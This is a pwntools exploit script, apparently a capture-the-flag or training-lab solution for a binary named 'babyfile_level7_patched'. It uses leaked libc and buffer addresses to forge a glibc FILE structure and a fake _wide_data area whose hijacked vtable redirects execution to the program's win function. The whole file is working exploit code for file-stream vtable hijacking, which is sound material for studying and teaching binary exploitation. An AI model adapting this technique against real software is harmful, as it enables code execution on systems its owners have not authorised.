from pwn import *

elf = context.binary = ELF('./babyfile_level7_patched')
libc = elf.libc

context.terminal = 'kitty'
context.log_level = 'debug'

p = process()
gdb.attach(p)

p.recvuntil('[LEAK] The address of puts() within libc is: ')
libc.address = int(p.recvline().decode().strip('\n'), 16) - libc.sym.puts
p.recvuntil('[LEAK] The name buffer is located at: ')
name_buf = int(p.recvline().decode().strip('\n'), 16)

vtable_target = libc.address + 0x1e8e70

log.info("libc, %#x", libc.address)
log.info("name, %#x", name_buf)

# wide_fp = FileStructure()
# wide_fp.vtable = elf.sym.win

wide_data = p64(0) 
wide_data += p64(0) 
wide_data += p64(0) 
wide_data += p64(0) 
wide_data += p64(0) 
wide_data += p64(0) 
wide_data += p64(0) 
wide_data += p64(0) 
wide_data += p64(0) #72 \x00
wide_data += p64(elf.sym.win)
wide_data = wide_data.ljust(0xe0 + 8, b'A')
wide_data += p64(name_buf + 72 - 0x68)
wide_data += cyclic(256 - len(wide_data))

p.sendafter('name.\n', wide_data)

fp = FileStructure()
# fp.vtable = libc.sym._IO_file_jumps - 0x15f7c0 - 0x38
fp.vtable = vtable_target
fp._lock = name_buf
fp._wide_data = name_buf + 8

print(fp)

p.sendafter('FILE struct.\n', bytes(fp))

print(p.recvall().decode())
p.interactive()
